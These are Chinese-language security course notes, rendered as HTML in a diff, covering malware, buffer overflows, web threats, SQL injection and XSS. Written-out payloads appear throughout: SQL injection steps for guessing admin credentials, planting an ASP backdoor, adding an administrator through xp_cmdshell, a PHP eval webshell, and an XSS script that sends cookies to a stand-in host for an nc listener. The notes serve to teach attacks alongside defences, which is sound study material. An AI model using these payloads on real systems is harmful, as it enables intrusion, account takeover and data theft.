+<h4 id="_36">计算机病毒<a class="headerlink" href="#_36" title="Permanent link">&para;</a></h4>
+<h4 id="_37">网络蠕虫<a class="headerlink" href="#_37" title="Permanent link">&para;</a></h4>
+<h4 id="_38">后门与木马<a class="headerlink" href="#_38" title="Permanent link">&para;</a></h4>
+<h4 id="_39">僵尸程序与僵尸网络<a class="headerlink" href="#_39" title="Permanent link">&para;</a></h4>
+<h4 id="rootkit">Rootkit<a class="headerlink" href="#rootkit" title="Permanent link">&para;</a></h4>
+<h3 id="_40">恶意代码分析方法<a class="headerlink" href="#_40" title="Permanent link">&para;</a></h3>
+<h4 id="_41">恶意代码分析技术概述<a class="headerlink" href="#_41" title="Permanent link">&para;</a></h4>
+<h4 id="_42">恶意代码分析环境<a class="headerlink" href="#_42" title="Permanent link">&para;</a></h4>
+<h4 id="_43">恶意代码静态分析技术<a class="headerlink" href="#_43" title="Permanent link">&para;</a></h4>
+<h4 id="_44">恶意代码动态分析技术<a class="headerlink" href="#_44" title="Permanent link">&para;</a></h4>
+<h2 id="shellcode">软件安全攻防——缓冲区溢出和 Shellcode<a class="headerlink" href="#shellcode" title="Permanent link">&para;</a></h2>
+<h3 id="_45">软件安全概述<a class="headerlink" href="#_45" title="Permanent link">&para;</a></h3>
+<h4 id="_46">软件安全漏洞威胁<a class="headerlink" href="#_46" title="Permanent link">&para;</a></h4>
+<h4 id="_47">软件安全困境<a class="headerlink" href="#_47" title="Permanent link">&para;</a></h4>
+<h4 id="_48">软件安全漏洞类型<a class="headerlink" href="#_48" title="Permanent link">&para;</a></h4>
+<h3 id="_49">缓冲区溢出基础概念<a class="headerlink" href="#_49" title="Permanent link">&para;</a></h3>
+<h4 id="_50">缓冲区溢出的基本概念<a class="headerlink" href="#_50" title="Permanent link">&para;</a></h4>
+<h4 id="_51">缓冲区溢出攻击背景知识<a class="headerlink" href="#_51" title="Permanent link">&para;</a></h4>
+<h4 id="_52">缓冲区异常攻击原理<a class="headerlink" href="#_52" title="Permanent link">&para;</a></h4>
+<h3 id="linux-shellcode">Linux 平台上的栈溢出与 Shellcode<a class="headerlink" href="#linux-shellcode" title="Permanent link">&para;</a></h3>
+<h4 id="linux_21">Linux 平台栈溢出攻击技术<a class="headerlink" href="#linux_21" title="Permanent link">&para;</a></h4>
+<h4 id="linux-shellcode_1">Linux 平台的 Shellcode 实现技术<a class="headerlink" href="#linux-shellcode_1" title="Permanent link">&para;</a></h4>
+<h3 id="windows-shellcode">Windows 平台上的栈溢出与 Shellcode<a class="headerlink" href="#windows-shellcode" title="Permanent link">&para;</a></h3>
+<h4 id="windows_18">Windows 平台栈溢出攻击技术<a class="headerlink" href="#windows_18" title="Permanent link">&para;</a></h4>
+<h4 id="windows-shellcode_1">Windows 平台的 Shellcode 实现技术<a class="headerlink" href="#windows-shellcode_1" title="Permanent link">&para;</a></h4>
+<h3 id="_53">堆溢出攻击<a class="headerlink" href="#_53" title="Permanent link">&para;</a></h3>
+<h3 id="_54">缓冲区溢出攻击的防御技术<a class="headerlink" href="#_54" title="Permanent link">&para;</a></h3>
+<h1 id="web_1">Web 安全攻防技术<a class="headerlink" href="#web_1" title="Permanent link">&para;</a></h1>
+<h2 id="web_2">Web 应用程序安全攻防<a class="headerlink" href="#web_2" title="Permanent link">&para;</a></h2>
+<h3 id="web_3">Web 应用程序体系结构及其安全威胁<a class="headerlink" href="#web_3" title="Permanent link">&para;</a></h3>
+<h4 id="web_4">Web 应用体系结构<a class="headerlink" href="#web_4" title="Permanent link">&para;</a></h4>
+<ul>
+<li>浏览器</li>
+<li>Web 服务器</li>
+<li>Web 应用程序</li>
+<li>数据库</li>
+<li>传输协议 HTTP/HTTPS</li>
+</ul>
+<h4 id="web_5">Web 应用安全威胁<a class="headerlink" href="#web_5" title="Permanent link">&para;</a></h4>
+<ul>
+<li>针对浏览器和终端用户的 Web 浏览安全威胁</li>
+<li>针对传输网络的网络协议安全威胁</li>
+<li>系统层安全威胁</li>
+<li>Web 服务器软件安全威胁</li>
+<li><strong>Web 应用程序安全威胁</strong></li>
+<li>Web 数据安全威胁</li>
+</ul>
+<h3 id="web_6">Web 应用程序安全攻防概述<a class="headerlink" href="#web_6" title="Permanent link">&para;</a></h3>
+<h4 id="_55">信息收集<a class="headerlink" href="#_55" title="Permanent link">&para;</a></h4>
+<ul>
+<li>手工审查 Web 应用程序结构与源代码</li>
+<li>静态和动态生成的页面</li>
+<li>目录结构</li>
+<li>辅助文件：CSS、XML、JavaScript、include 文件等</li>
+<li>输入表单：GET/POST、表单处理行为、输入字段名称、最大长度限制、隐藏字段、自动完成标记、口令字段</li>
+<li>查询参数字符串</li>
+<li>自动下载与镜像 Web 站点页面</li>
+<li>使用 Google Hacking 技术审查与探测 Web 应用程序</li>
+<li>Web 应用程序安全评估与漏洞探测</li>
+<li>浏览器插件</li>
+<li>Web 应用安全评估工具和漏洞扫描器：<ol>
+<li>以 Web 服务器与客户端之间的代理方式运行</li>
+<li>结合爬虫技术对目标 Web 站点进行源码爬取、分析与评估探测</li>
+<li>黑客攻击工具</li>
+</ol>
+</li>
+</ul>
+<h4 id="web_7">攻击 Web 服务器软件<a class="headerlink" href="#web_7" title="Permanent link">&para;</a></h4>
+<ul>
+<li>
+<p>数据驱动的远程代码执行安全漏洞：缓冲区溢出、不安全的指针、格式化字符串等</p>
+</li>
+<li>
+<p>服务器功能扩展模块漏洞：</p>
+</li>
+<li>
+<p>样本文件安全漏洞</p>
+</li>
+<li>
+<p>源代码泄露</p>
+</li>
+<li>
+<p>资源解析攻击</p>
+</li>
+</ul>
+<h4 id="web_8">攻击 Web 应用程序<a class="headerlink" href="#web_8" title="Permanent link">&para;</a></h4>
+<p>OWASP Top 10</p>
+<ul>
+<li>访问控制失效</li>
+<li>加密失效</li>
+<li>注入攻击</li>
+<li>不安全设计</li>
+<li>安全配置错误</li>
+<li>易受攻击且过时的组件</li>
+<li>身份识别与认证失效</li>
+<li>软件与数据完整性失效</li>
+<li>安全日志与监控失效</li>
+<li>服务器端请求伪造</li>
+</ul>
+<h4 id="web_9">攻击 Web 数据内容<a class="headerlink" href="#web_9" title="Permanent link">&para;</a></h4>
+<ul>
+<li>安全敏感数据泄露</li>
+<li>Web 服务器存在目录遍历漏洞或不安全的目录文件枚举配置</li>
+<li>利用 Web 服务器（FTP 服务器）的 Upload、income 等上传目录临时中转文件时泄露</li>
+<li>缺乏安全意识，在 Web 站点公开的文档资料中包含秘密信息</li>
+<li>网页纂改：“被黑站点”</li>
+<li>不良信息内容上传</li>
+</ul>
+<h4 id="web_10">Web 应用安全防范措施<a class="headerlink" href="#web_10" title="Permanent link">&para;</a></h4>
+<ul>
+<li>Web 站点网络传输安全设防措施</li>
+<li>HTTPS</li>
+<li>加密的连接通道，避免使用 telnet、FTP、HTTP，而使用 SSH、SFTP</li>
+<li>对于关键的 Web 服务器：<ul>
+<li>设置静态绑定 MAC-IP映射</li>
+<li>在服务网段内进行 ARP 等各类欺骗攻击的检测与 MAC 封禁机制</li>
+<li>在网关位置部署防火墙与 IDS</li>
+<li>对 Dos 攻击采用冗余等机制</li>
+</ul>
+</li>
+<li>Web 站点操作系统及服务安全设防措施</li>
+<li>及时的补丁更新<ul>
+<li>Windows：通过软件正版化采纳自动更新补丁服务，部署 Windows Server 更新服务</li>
+<li>Linux：采用 apt、yum 等软件自动更新工具，crond 设置定期更新任务脚本</li>
+</ul>
+</li>
+<li>远程安全漏洞扫描</li>
+<li>一般性设防措施<ul>
+<li>关闭所有不使用的服务，避免使用明文传输的网络服务</li>
+<li>设置强口令字，以及安全的服务配置</li>
+<li>部署防火墙，设置对控制及内容上传通道的限制访问</li>
+<li>配置数据备份服务，必要时设置冗余和双机热备机制</li>
+</ul>
+</li>
+<li>Web 应用程序安全设防措施</li>
+<li>谨慎考虑是否采用动态页面技术、是否支持客户端执行代码、是否接受用户输入</li>
+<li>尽量使用具有良好安全声誉及稳定技术力量支持的 Web 应用软件包，并定期进行 Web 应用程序的安全评估和漏洞检测，对 Web 应用程序跟进版本更新和安全补丁发布情况</li>
+<li>只在必要时自主或外包开发应用程序，在开发和部署过程中重视安全编程、持续性的安全测试与维护<ul>
+<li>独立、完整且集中的输入校正：校验全部的程序输入、校验输入长度与类型</li>
+<li>对 HTTP 所有内容进行校验：校验向用户输出的数据，使用安全的 SQL 查询方式</li>
+<li>禁止使用 JavaScript 进行任何校验</li>
+<li>使用安全统一的编码或转义方式</li>
+<li>设定有安全的权限边界</li>
+<li>校验被调用的后台命令、校验被调用的文本或配置文件、确保程序所记录的日志可控</li>
+</ul>
+</li>
+<li>使用 Web 服务器软件提供的日志功能<ul>
+<li>访问用户名、请求 URL、 referer 来源链接等</li>
+</ul>
+</li>
+<li>Web 站点数据安全设防措施</li>
+<li>提高网站内容维护人员的数据安全意识</li>
+<li>对维护网站的数据安全实施日常监测和防护</li>
+</ul>
+<h3 id="sql">SQL 注入<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h3>
+<h4 id="sql_1">SQL 注入攻击原理<a class="headerlink" href="#sql_1" title="Permanent link">&para;</a></h4>
+<p>向 Web 应用程序提供的用户输入接口（动态页面的输入参数、表单的输入框等）输入一段精心构造的 SQL 查询命令，攻击和利用不完善的输入验证机制，使注入代码得以执行完成非预期的攻击操作行为。</p>
+<h4 id="sql_2">SQL 注入攻击步骤和过程<a class="headerlink" href="#sql_2" title="Permanent link">&para;</a></h4>
+<ol>
+<li>
+<p>发现 SQL 注入点</p>
+</li>
+<li>
+<p>整数型参数</p>
+<div class="highlight"><pre><span></span><code><span class="n">SELCET</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">some_table</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">some_rec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">yyy</span>
+</code></pre></div>
+<ul>
+<li><code>yyy</code> -&gt; <code>yyy'</code>：返回错误提示信息</li>
+<li><code>yyy</code> -&gt; <code>yyy and 1=1</code>：返回正常页面</li>
+<li><code>yyy</code> -&gt; <code>yyy and 1=2</code>：返回空白页面或错误提示信息</li>
+</ul>
+<p>如果满足以上三种情况，存在注入点。</p>
+</li>
+<li>
+<p>字符型参数</p>
+<div class="highlight"><pre><span></span><code><span class="n">SELCET</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">some_table</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">some_rec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;yyy&#39;</span>
+</code></pre></div>
+<ul>
+<li><code>yyy</code> -&gt; <code>yyy'</code>：返回错误提示信息</li>
+<li><code>yyy</code> -&gt; <code>yyy' and '1'='1</code>：返回正常页面</li>
+<li><code>yyy</code> -&gt; <code>yyy' and '1'='2</code>：返回空白页面或错误提示信息</li>
+</ul>
+<p>如果满足以上三种情况，存在注入点。</p>
+</li>
+<li>
+<p>判断后台数据库类型</p>
+</li>
+<li>
+<p>利用数据库特有函数进行判断</p>
+<ul>
+<li>SQL Server：使用 <code>@@version</code> 查看版本，<code>db_name()</code> 查看当前数据库名</li>
+<li>MySQL：使用 <code>version()</code> 查看版本，<code>database()</code> 查看当前数据库名</li>
+<li>Oracle：使用 <code>sysdate</code> 获取系统时间，<code>user</code> 获取当前用户</li>
+</ul>
+</li>
+<li>
+<p>利用数据库服务器的系统变量进行判断</p>
+<ul>
+<li>SQL Server: <code>user</code>, <code>db_name()</code></li>
+</ul>
+<div class="highlight"><pre><span></span><code>http://SITE/xxx.asp?some_rec = yyy and db_name()&gt;0
+</code></pre></div>
+<ul>
+<li>MySQL: <code>basedir</code></li>
+</ul>
+</li>
+<li>
+<p>利用数据库服务器的系统表进行判断</p>
+<div class="highlight"><pre><span></span><code>http://SITE/xxx.asp?some_rec = yyy and (select count (*) from sysobjects)&gt;0
+http://SITE/xxx.asp?some_rec = yyy and (select count (*) from msysobjects)&gt;0
+</code></pre></div>
+<ul>
+<li>SQL Server: 第一条请求 URL 运行正常，第二条异常</li>
+<li>ACCESS: 两条都异常，因为在 Web 环境下没有对 <code>msysobjects</code> 系统表的访问权限</li>
+</ul>
+</li>
+<li>
+<p>后台数据库中管理员口令字猜解</p>
+</li>
+<li>
+<p>猜解表名</p>
+<div class="highlight"><pre><span></span><code>http://SITE/xxx.asp?some_rec = yyy and (select count (*) from guessed_tbl_name)&gt;0
+</code></pre></div>
+</li>
+<li>
+<p>猜解字段名</p>
+<div class="highlight"><pre><span></span><code>http://SITE/xxx.asp?some_rec = yyy and (select Count(guessed_rec_name) from Admin)&gt;0
+</code></pre></div>
+</li>
+<li>
+<p>用户名与口令猜解</p>
+<p>取第一条记录，首先猜解用户名字段的长度：</p>
+<div class="highlight"><pre><span></span><code>http://SITE/xxx.asp?some_rec = yyy and (select top 1 len(username) from Admin)&gt;[guessed_length]
+</code></pre></div>
+<p>逐位猜解字符串每位字符的 ASCII 值，可以使用二分法：</p>
+<div class="highlight"><pre><span></span><code><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">top</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">asc</span><span class="p">(</span><span class="n">mid</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">N</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">Admin</span><span class="p">)</span><span class="o">&gt;</span><span class="p">[</span><span class="n">guessed_ascii</span><span class="p">]</span>
+</code></pre></div>
+<p>对口令值的猜解过程类似，但数据库存储的口令有时是 MD5 加密的，可以通过注入 SQL 修改口令，或者使用破译工具破解。</p>
+</li>
+<li>
+<p>上传 ASP 后门，得到默认账户权限</p>
+</li>
+</ol>
+<p>SQL Server: 还可以利用 BCP 命令，将写入临时表终端 ASP 后台脚本内容导成文本文件，并放置到指定位置</p>
+<div class="highlight"><pre><span></span><code>bcp<span class="w"> </span><span class="s2">&quot;select codes from tmp_tbl&quot;</span><span class="w"> </span>queryout<span class="w"> </span>c:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot<span class="se">\r</span>uncommand.asp<span class="w"> </span>-c<span class="w"> </span>-S<span class="w"> </span>localhosgtg<span class="w"> </span>-U<span class="w"> </span>sa<span class="w"> </span>-P<span class="w"> </span>foobar
+</code></pre></div>
+<ol>
+<li>
+<p>本地权限提升</p>
+</li>
+<li>
+<p>利用数据库扩展存储过程执行 Shell 命令</p>
+</li>
+</ol>
+<p>若数据库连接支持类似于 SQL Server 的 <code>xp_cmdshell</code> 扩展存储过程，且拥有数据库管理系统的最高管理权限，就可以利用该存储过程调用 Shell 命令进行任意操作，而无需步骤3~5</p>
+<p>通过请求如下 URL，在系统中添加一个用户，并将其加入到本地管理员组：</p>
+<div class="highlight"><pre><span></span><code>http://SITE/xxx.asp?some_rec = yyy; exec master.xp_cmdshell &quot;net user name password /add&quot;
+http://SITE/xxx.asp?some_rec = yyy; exec master.xp_cmdshell &quot;net localgroup name administrators /add&quot;
+</code></pre></div>
+<h4 id="sql_3">SQL 注入类型<a class="headerlink" href="#sql_3" title="Permanent link">&para;</a></h4>
+<h5 id="_56">按 “注入点位置” 分类<a class="headerlink" href="#_56" title="Permanent link">&para;</a></h5>
+<p>根据攻击者可控制的输入位置（即注入点）划分，决定了注入的触发途径：</p>
+<ul>
+<li>GET 注入</li>
+</ul>
+<p>注入点位于 URL 的 GET 参数中（如 <code>http://xxx.com/detail?id=1</code> 中的 id 参数），攻击者通过修改 URL 参数值插入 SQL 语句（如 <code>id=1' or 1=1--</code>），是最易发现的注入类型。</p>
+<ul>
+<li>POST 注入</li>
+</ul>
+<p>注入点位于表单提交的 POST 参数中（如登录表单的 “用户名”“密码” 字段），攻击者在输入框中填入 SQL 片段（如用户名输入 <code>admin' --</code>），因参数不直接暴露在 URL 中，隐蔽性略高。</p>
+<ul>
+<li>Cookie 注入</li>
+</ul>
+<p>注入点位于 HTTP 请求的 Cookie 字段中，若服务器使用 Cookie 参数（如 user=123）拼接 SQL 查询，攻击者可篡改 Cookie 值（如 <code>user=123' or 1=1--</code>）触发注入，常见于依赖 Cookie 识别用户的场景。</p>
+<ul>
+<li>HTTP 头注入</li>
+</ul>
+<p>注入点位于 HTTP 请求头（如 Referer、User-Agent、X-Forwarded-For 等），若服务器将头信息代入 SQL 查询（如记录访问来源时拼接 Referer），攻击者可篡改头信息插入 SQL 语句，此类注入隐蔽性强，易被忽略。</p>
+<h5 id="_57">按 “利用原理与反馈方式” 分类<a class="headerlink" href="#_57" title="Permanent link">&para;</a></h5>
+<p>根据服务器对注入语句的响应反馈特征划分，决定了攻击的技术手段：</p>
+<ul>
+<li>显错注入</li>
+<li>
+<p>特征：注入错误 SQL 语句后，服务器返回详细数据库错误信息（如 MySQL 的语法错误提示），攻击者可通过报错直接获取数据库结构（表名、字段名等）。</p>
+</li>
+<li>
+<p>示例：利用 <code>extractvalue(1,concat(0x7e,(select database()),0x7e))</code> 触发报错，直接读取当前数据库名。</p>
+</li>
+<li>
+<p>盲注（无显式错误反馈）</p>
+</li>
+</ul>
+<p>服务器不返回错误信息，仅通过间接响应判断注入结果，又分两类：</p>
+<ul>
+<li>布尔盲注：注入布尔判断语句（如 <code>id=1' and (substr(username,1,1)='a')--</code>），通过页面 “正常显示” 或 “异常空白” 判断条件真假，逐字符猜解数据。</li>
+<li>
+<p>时间盲注：注入延迟判断语句（如 <code>id=1' and if(条件,sleep(5),0)--</code>），通过服务器 “是否延迟响应” 判断条件真假，适用于无任何页面差异的场景。</p>
+</li>
+<li>
+<p>Union 注入</p>
+</li>
+<li>
+<p>原理：利用 SQL 的 <code>UNION</code> 关键字，将注入的查询结果与原页面查询结果合并返回，适用于原查询返回数据集的场景（如商品列表、用户列表）。</p>
+<ul>
+<li>操作步骤：先通过 <code>order by</code> 判断字段数，再用 <code>union select</code> 注入查询（如 <code>id=-1' union select 1,version(),3--</code>）获取数据库信息。</li>
+</ul>
+</li>
+<li>
+<p>堆叠查询注入</p>
+</li>
+<li>
+<p>原理：利用数据库支持多语句执行的特性（如 MySQL 用 ; 分隔），注入多个 SQL 语句（如 <code>id=1'; drop table users;--</code>），可执行查询、删除、修改等操作。</p>
+<ul>
+<li>限制：需数据库支持多语句执行（如 MySQL 默认支持，SQL Server 部分场景支持），且应用程序会执行所有拼接语句。</li>
+</ul>
+</li>
+</ul>
+<h5 id="_58">按 “攻击目标” 分类<a class="headerlink" href="#_58" title="Permanent link">&para;</a></h5>
+<p>根据注入的最终意图和造成的影响划分：</p>
+<ul>
+<li>数据窃取注入</li>
+</ul>
+<p>目的是获取数据库敏感数据（如用户账号密码、订单信息），通过显错、盲注、联合查询等方式实现，是最常见的注入目的。</p>
+<ul>
+<li>权限提升注入</li>
+</ul>
+<p>通过注入修改数据库权限（如 <code>grant all privileges</code>）或篡改管理员账号（如 <code>update users set password='123' where username='admin'--</code>），获取系统更高权限。</p>
+<ul>
+<li>文件操作注入</li>
+</ul>
+<p>利用数据库文件操作函数（如 MySQL 的 <code>into outfile</code>），将恶意代码写入服务器文件系统（如生成后门脚本 <code>&lt;?php eval($_POST[cmd]);?&gt;</code>），控制服务器。</p>
+<ul>
+<li>破坏性注入</li>
+</ul>
+<p>注入 <code>drop table</code>、<code>delete from</code> 等语句删除数据，或执行 <code>shutdown</code> 命令中断数据库服务，破坏业务正常运行，危害性极大。</p>
+<h4 id="sql_4">SQL 注入攻击工具<a class="headerlink" href="#sql_4" title="Permanent link">&para;</a></h4>
+<ul>
+<li><a href="C:\Data\Desktop\Learning\SQLmap.md">SQLmap</a></li>
+</ul>
+<h4 id="sql_5">SQL 注入攻击防范措施<a class="headerlink" href="#sql_5" title="Permanent link">&para;</a></h4>
+<ul>
+<li>
+<p>使用类型安全（type-safety）的输出编码机制</p>
+</li>
+<li>
+<p>检查来自外部的用户输入，对包含限制字符的查询进行拒绝或转义</p>
+</li>
+<li>整数型用户参数：限制其包含非数字字符</li>
+<li>
+<p>字符串型用户参数：限制保护引号、分号、百分号等 SQL 语句保留符号</p>
+</li>
+<li>
+<p>将动态 SQL 语句替换为存储过程、预编译 SQL 或 ADO 命令对象</p>
+</li>
+<li>
+<p>存储过程</p>
+<ul>
+<li>
+<p>原理：在数据库中预定义包含参数的SQL逻辑，应用程序仅传递参数值，不直接拼接SQL。数据库会将参数视为纯数据，而非可执行代码。</p>
+</li>
+<li>
+<p>示例（以SQL Server为例）：  </p>
+</li>
+</ul>
+<p>先创建存储过程（含参数<code>@username</code>和<code>@password</code>）：</p>
+<div class="highlight"><pre><span></span><code><span class="w">  </span><span class="k">CREATE</span><span class="w"> </span><span class="k">PROCEDURE</span><span class="w"> </span><span class="n">LoginUser</span>
+<span class="w">      </span><span class="o">@</span><span class="n">username</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">50</span><span class="p">),</span>
+<span class="w">      </span><span class="o">@</span><span class="n">password</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span>
+<span class="w">  </span><span class="k">AS</span>
+<span class="w">  </span><span class="k">BEGIN</span>
+<span class="w">      </span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">@</span><span class="n">username</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">@</span><span class="n">password</span>
+<span class="w">  </span><span class="k">END</span>
+<span class="w">  </span><span class="o">````</span>
+
+<span class="err">应用程序调用时仅传递参数值（以</span><span class="n">VB为例</span><span class="err">）：</span>
+
+<span class="o">```</span><span class="n">vb</span>
+<span class="s1">&#39; 使用ADO调用存储过程，参数化传递</span>
+<span class="s1">Set cmd = New ADODB.Command</span>
+<span class="s1">cmd.ActiveConnection = conn &#39;</span><span class="w"> </span><span class="err">已建立的连接</span>
+<span class="n">cmd</span><span class="p">.</span><span class="n">CommandText</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;LoginUser&quot;</span><span class="w"> </span><span class="s1">&#39; 存储过程名称</span>
+<span class="s1">cmd.CommandType = adCmdStoredProc &#39;</span><span class="w"> </span><span class="err">声明为存储过程</span>
+
+<span class="s1">&#39; 添加参数（类型、长度需与存储过程匹配）</span>
+<span class="s1">cmd.Parameters.Append cmd.CreateParameter(&quot;@username&quot;, adVarChar, adParamInput, 50, username)</span>
+<span class="s1">cmd.Parameters.Append cmd.CreateParameter(&quot;@password&quot;, adVarChar, adParamInput, 50, password)</span>
+
+<span class="s1">&#39;</span><span class="w"> </span><span class="err">执行并获取结果</span>
+<span class="k">Set</span><span class="w"> </span><span class="n">rs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cmd</span><span class="p">.</span><span class="k">Execute</span>
+</code></pre></div>
+</li>
+<li>
+<p>预编译SQL</p>
+<ul>
+<li>
+<p>原理：先向数据库发送“带参数占位符”的 SQL 模板，数据库预编译后，仅接收参数值执行。占位符（如<code>?</code>或<code>@参数名</code>）会被数据库解析为纯数据占位，不执行任何代码。</p>
+</li>
+<li>
+<p>示例：</p>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="x">$stmt = $conn-&gt;prepare(&quot;SELECT name, local, gender</span>
+<span class="x">                      FROM USER_TABLE</span>
+<span class="x">                      WHERE id = ? and password = ? &quot;);</span>
+<span class="x"> // 绑定参数</span>
+<span class="x">$stmt-&gt;bind_param(&quot;is&quot;, $id, $pwd);</span>
+<span class="x">$stmt-&gt;execute();</span>
+<span class="x">$stmt-&gt;bind_result($bind_name, $bind_local, $bind_gender);</span>
+<span class="x">$stmt-&gt;fetch();</span>
+</code></pre></div>
+</li>
+<li>
+<p>ADO命令对象</p>
+<ul>
+<li>
+<p>原理：ADO的<code>Command</code>对象支持参数化查询，通过<code>Parameters</code>集合定义参数，SQL语句中用<code>?</code>或命名参数（如<code>@username</code>）作为占位符，最终由ADO将参数安全传递给数据库。</p>
+</li>
+<li>
+<p>示例（VBScript/ASP中使用ADO）： </p>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><code>&#39; 1. 创建Command对象并关联连接
+Set cmd = Server.CreateObject(&quot;ADODB.Command&quot;)
+cmd.ActiveConnection = conn &#39; 已打开的Connection对象
+
+&#39; 2. 定义带参数的SQL模板（用?作为占位符）
+cmd.CommandText = &quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;
+cmd.CommandType = adCmdText &#39; 声明为SQL文本
+
+&#39; 3. 添加参数（指定类型、长度、值，与占位符顺序对应）
+cmd.Parameters.Append cmd.CreateParameter(&quot;param1&quot;, adVarChar, adParamInput, 50, username)
+cmd.Parameters.Append cmd.CreateParameter(&quot;param2&quot;, adVarChar, adParamInput, 50, password)
+
+&#39; 4. 执行查询，获取结果集
+Set rs = cmd.Execute
+</code></pre></div>
+</li>
+<li>
+<p>加强 SQL 数据库服务器的配置与连接</p>
+</li>
+</ul>
+<h3 id="xss">XSS 跨站脚本攻击<a class="headerlink" href="#xss" title="Permanent link">&para;</a></h3>
+<h4 id="xss_1">XSS 攻击技术原理<a class="headerlink" href="#xss_1" title="Permanent link">&para;</a></h4>
+<p>允许用户交互的 Web 应用程序中，用户提交内容中可以包含 HTML、JavaScript 及其他脚本代码，一旦 Web应用程序没有对这些输入的合法性进行有效检查与过滤，就很有可能让这些恶意代码逻辑包含在服务器动态产生或更新的网页中。</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="sr">/xss/</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+
+<span class="cm">&lt;!--&gt;窃取 Cookie&lt;/!--&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s1">&#39;http://steal_cookie_exapmle.com/getcookie.php?cookie=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+
+<span class="cm">&lt;!--&gt;植入木马&lt;/!--&gt;</span>
+<span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://targer_link&quot;</span> <span class="na">height</span><span class="o">=</span><span class="s">0</span> <span class="na">width</span><span class="o">=</span><span class="s">0</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://targer_link&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="xss_2">XSS 攻击类型<a class="headerlink" href="#xss_2" title="Permanent link">&para;</a></h4>
+<ul>
+<li>持久型 XSS 漏洞（存储型 XSS 漏洞）</li>
+<li>原理：若用户输入持久性地保存在 Web 服务器端，并在正常页面中持续性地显示，从而影响所有访问这些页面的其他用户，那么系统很可能存在持久型 XSS 漏洞。</li>
+<li>
+<p>场景：留言板、BBS、博客等</p>
+</li>
+<li>
+<p>非持久型 XSS 漏洞（反射型 XSS 漏洞）</p>
+</li>
+<li>
+<p>原理：若 Web 浏览器通过 HTTP 请求参数或 HTML 提交表单传递数据，服务器端脚本未对这些数据进行恰当的安全验证与过滤，就直接使用并生成返回给用户的结果页面，那么系统很可能存在非持久型 XSS 漏洞。</p>
+</li>
+<li>
+<p>场景：站点搜索引擎</p>
+<ol>
+<li>
+<p>攻击者构造一个包含恶意脚本的 <code>bank.com</code> 登录请求链接，并通过 Email/HTTP 等方式将该链接发送给其他用户</p>
+</li>
+<li>
+<p>受害用户点击链接，将会把链接中的恶意脚本当作用户名参数提交给 <code>bank.com</code> 的登陆处理网页</p>
+</li>
+<li>
+<p>由于<code>bank.com</code> 登陆处理网页存在 XSS 漏洞，将会在反馈的欢迎页面中包含恶意客户端脚本</p>
+</li>
+<li>
+<p>攻击者的恶意客户端脚本在受害用户浏览器中执行，通常会驱动浏览器向攻击者发送会话令牌，如会话 ID、Cookie等信息</p>
+</li>
+</ol>
+<div class="highlight"><pre><span></span><code><span class="c1"># Netcat是攻击者常用的一个工具。运行带有 -l 选项时，它会变成一个监听指定端口的 TCP 服务器。这个服务器会打印出客户端发来的信息，并将用户输入的内容发回给客户端。</span>
+<span class="c1"># 选项 -l 指定 nc 运行一个服务器。选项 -nv 使 nc 输出更详细的信息。选项 -k 表示当一次连接完成后，继续等待其他连接。</span>
+nc<span class="w"> </span>-lknv<span class="w"> </span><span class="m">5555</span>
+</code></pre></div>
+<ol>
+<li>攻击者获得用户会话令牌后，就可以劫持用户对话，或者伪造用户登录 <code>bank.com</code> ，并可实施进一步攻击</li>
+</ol>
+</li>
+<li>
+<p>基于 DOM 的 XSS 漏洞（客户端 XSS 漏洞）</p>
+</li>
+<li>
+<p>原理：前端 JavaScript 代码将 URL 参数、Hash 值等攻击者可控的输入数据，未经安全过滤或转义就直接用于 DOM 操作（如通过<code>innerHTML</code>插入页面、设置<code>href</code>属性等），导致恶意脚本被注入并执行；整个过程无需与服务器交互，完全在浏览器客户端完成，本质是前端代码对用户输入的不安全处理，使攻击者能通过构造恶意输入触发脚本执行，进而窃取信息或伪造操作。</p>
+</li>
